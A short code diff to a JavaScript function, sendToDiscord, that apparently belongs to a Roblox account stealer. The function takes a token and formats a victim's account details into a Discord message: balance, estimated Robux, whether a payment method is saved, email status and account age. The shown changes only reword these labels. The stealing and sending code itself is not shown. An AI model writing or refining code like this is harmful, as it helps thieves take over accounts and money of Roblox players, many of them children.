@@ -1874,7 +1874,7 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
           },
           {
             name: "<a:emoji_33:1410233678226788443> Billing",
-            value: `Balance: ${userData.creditBalance && userData.creditBalance > 0 ? `$${userData.creditBalance} (Est. ${Math.floor(userData.creditBalance * 80)} Robux)`: "$0"}\nSaved Payment: ${userData.savedPayment ? "Yes" : "No"}`,
+            value: `Balance: ${userData.creditBalance && userData.creditBalance > 0 ? `$${userData.creditBalance} (Est. ${Math.floor(userData.creditBalance * 80)} Robux)`: "$0"}\nSaved Payment: ${userData.savedPayment ? "True" : "False"}`,
             inline: false
           
           },
@@ -1907,7 +1907,7 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
           },
           {
             name: " Settings",
-            value: `Email Verified: ${userData.emailVerified ? "Yes" : "No"}\nVoice Chat: ${userData.voiceChatEnabled ? "Yes" : "No"}\nAccount Age: ${userData.accountAge || 0} Days`,
+            value: `Email Status: ${userData.emailVerified ? "Verified" : "Unverified"}\nVoice Chat: ${userData.voiceChatEnabled ? "Enabled" : "Disabled"}\nAccount Age: ${userData.accountAge || 0} Days`,
             inline: false                  
           },
           
